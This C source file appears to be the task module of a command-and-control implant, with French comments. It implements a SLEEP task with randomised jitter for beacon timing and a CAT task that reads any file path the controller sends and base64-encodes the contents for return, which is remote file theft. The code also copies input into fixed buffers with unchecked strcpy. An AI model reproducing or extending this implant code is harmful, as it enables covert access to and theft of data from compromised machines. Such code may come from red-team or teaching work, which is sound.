//
// Created by melo on 4/8/25.
//

#include "tasks.h"
#include "base64.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stddef.h>

char * sleep_task(char * buffer_fetch, char * dest_result) {
    /*
    Tache qui coupe le programme pendant X secondes sur demande du C2
    format de l'entrée : SLEEP,e2f6421cfa,MQ==,MA==
    format de la sortie : e2f6421cfa : ID de la tache
    modifie dest_result : contient vide pour sleep
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original string

    char * commande = strtok(buffer, ",");
    if (strcmp(commande, "SLEEP") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * timer_string = strtok(NULL, ",");
    char * decoded_timer = NULL;
    decoder_base64(timer_string, &decoded_timer);
    int timer = atoi(decoded_timer);
    free(decoded_timer);

    char * random_string = strtok(NULL, ",");
    char * decoded_random = NULL;
    decoder_base64(random_string, &decoded_random);
    int random = atoi(decoded_random);
    free(decoded_random);

    // Initialize random seed
    srand(time(NULL));
    printf("random: %d\n", random);
    printf("timer: %d\n", timer);

    int sleep_time;
    if (random > 0) {
        sleep_time = timer - random + rand() % (2 * random + 1);
    } else {
        sleep_time = timer;
    }

    if (sleep_time < 0) {
        sleep_time = 0;
    }

    printf("Sleeping for %d seconds\n", sleep_time);
    sleep(sleep_time);

    // No result for sleep task
    dest_result[0] = '\0';

    return task_ID_copy;
}

char * cat_task(char * buffer_fetch, char * dest) {
    /*
    Tache qui affiche le contenu d'un fichier sur demande du C2
    format de l'entrée : CAT,847532c65b,Li90ZXN0
    format de la sortie : e2f6421cfa : ID de la tache
    modifie dest : contient la base 64 du fichier
    */
    char buffer[1024];
    strcpy(buffer, buffer_fetch);

    char * command = strtok(buffer, ",");
    if (strcmp(command, "CAT") != 0) {
        printf("Invalid command\n");
        return NULL;
    }

    char * task_ID = strtok(NULL, ",");
    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID

    char * file_path = strtok(NULL, ",");
    if (file_path == NULL) {
        printf("Missing file path\n");
        free(task_ID_copy);
        return NULL;
    }

    char * decoded_file_path = NULL;
    decoder_base64(file_path, &decoded_file_path);
    if (decoded_file_path == NULL) {
        printf("Failed to decode file path\n");
        free(task_ID_copy);
        return NULL;
    }

    FILE *file = fopen(decoded_file_path, "r");
    if (file == NULL) {
        perror("Error opening file");
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Read file content
    char *file_content = malloc(file_size + 1);
    if (file_content == NULL) {
        perror("Memory allocation failed");
        fclose(file);
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    size_t read_size = fread(file_content, 1, file_size, file);
    file_content[read_size] = '\0';
    fclose(file);

    // Encode file content to base64
    char *encoded_content = NULL;
    encoder_base64(file_content, &encoded_content);
    if (encoded_content == NULL) {
        printf("Failed to encode file content\n");
        free(file_content);
        free(decoded_file_path);
        free(task_ID_copy);
        return NULL;
    }

    // Copy the encoded content to dest
    strcpy(dest, encoded_content);

    // Clean up
    free(file_content);
    free(encoded_content);
    free(decoded_file_path);

    return task_ID_copy;
}
